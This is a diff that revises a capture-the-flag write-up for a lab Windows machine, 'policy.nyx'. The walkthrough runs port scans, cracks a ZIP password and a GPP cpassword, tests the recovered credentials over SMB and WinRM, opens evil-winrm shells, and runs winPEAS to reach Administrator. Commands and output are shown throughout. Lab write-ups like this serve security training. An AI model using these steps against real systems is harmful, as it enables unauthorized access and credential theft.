@@ -13,8 +13,8 @@
 A backup directory on the web server holds a password-protected ZIP, cracked with `rockyou.txt`, containing a `Groups.xml` file — the classic artifact left behind by Group Policy Preferences. Its encrypted `cpassword` field decrypts instantly with `gpp-decrypt`, since the AES key Microsoft used for it has been public for years. That account's WinRM session leads to `winPEAS` turning up the Administrator's own credentials.
 
 ## Enumeration
-### Port Scanning
-A full TCP port scan is run first:
+### Port Enumeration
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn policy.nyx
@@ -36,7 +36,7 @@ PORT      STATE  SERVICE       REASON
 MAC Address: 08:00:27:2A:C3:D9 (Oracle VirtualBox virtual NIC)
 ```
 
-A version/script scan against the open ports fills in the details — a typical Windows/AD-adjacent spread, SMB and WinRM (5985) included:
+A version and script scan on the open ports fills in the details — a typical Windows/AD-adjacent spread, SMB and WinRM (5985) included:
 
 ```bash
 $ sudo nmap -p 80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV policy.nyx
@@ -81,6 +81,7 @@ Host script results:
 ```
 http://policy.nyx/
 ```
+
 <img src="../Images/policy/Pasted image 20260728202042.png"/>
 
 ```bash
@@ -114,7 +115,8 @@ $ unzip groups.zip
 Archive:  groups.zip
 [groups.zip] Groups.xml password:
 ```
-The archive is password-protected. Its hash is extracted and cracked:
+
+The archive is password-protected, so `zip2john` extracts the hash and `john` cracks it:
 
 ```bash
 $ zip2john groups.zip > groups_hash
@@ -137,6 +139,7 @@ Archive:  groups.zip
 [groups.zip] Groups.xml password:
   inflating: Groups.xml
 ```
+
 ```bash
 $ cat Groups.xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -158,11 +161,14 @@ GPP2k26blahblah
 
 ### Shell as xerosec
 
+The recovered pair works over both SMB and WinRM — and the `(Pwn3d!)` on the WinRM line means `xerosec` can open an interactive session:
+
 ```bash
 $ nxc smb policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'
 SMB    policy.nyx  445  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
 SMB    policy.nyx  445  POLICY  [+] POLICY\xerosec:GPP2k26blahblah
 ```
+
 ```bash
 $ nxc winrm policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'
 WINRM  policy.nyx  5985  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY)
@@ -173,26 +179,33 @@ WINRM  policy.nyx  5985  POLICY  [+] POLICY\xerosec:GPP2k26blahblah (Pwn3d!)
 $ evil-winrm -i policy.nyx -u 'xerosec' -p 'GPP2k26blahblah'
 
 *Evil-WinRM* PS C:\Users\xerosec\Documents> whoami
+policy\xerosec
 ```
 
 ## Privilege Escalation
 
 ### Credentials via winPEAS
 
+`winPEAS` handles the usual privilege-escalation checks; uploading and running it from a writable temp directory:
+
 ```powershell
 *Evil-WinRM* PS C:\Users\xerosec\Documents> cd $env:temp
 *Evil-WinRM* PS C:\Users\xerosec\AppData\Local\Temp> upload winPEASx64.exe
 *Evil-WinRM* PS C:\Users\xerosec\AppData\Local\Temp> ./winPEASx64.exe
 ```
+
 <img src="../Images/policy/Pasted image 20260728211039.png"/>
 
 > **Credentials:** `administrator:GigaAdmin123!`
+
+The Administrator credentials check out over both SMB and WinRM, again with `(Pwn3d!)`:
 
 ```bash
 $ netexec smb policy.nyx -u 'administrator' -p 'GigaAdmin123!'
 SMB    policy.nyx  445  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
 SMB    policy.nyx  445  POLICY  [+] POLICY\administrator:GigaAdmin123! (Pwn3d!)
 ```
+
 ```bash
 $ netexec winrm policy.nyx -u 'administrator' -p 'GigaAdmin123!'
 WINRM  policy.nyx  5985  POLICY  [*] Windows 10 / Server 2019 Build 17763 x64 (name:POLICY) (domain:POLICY) (signing:False) (SMBv1:None)
@@ -208,7 +221,6 @@ $ evil-winrm -i policy.nyx -u 'administrator' -p 'GigaAdmin123!'
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 policy\administrator
 ```
-
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users\xerosec\Desktop
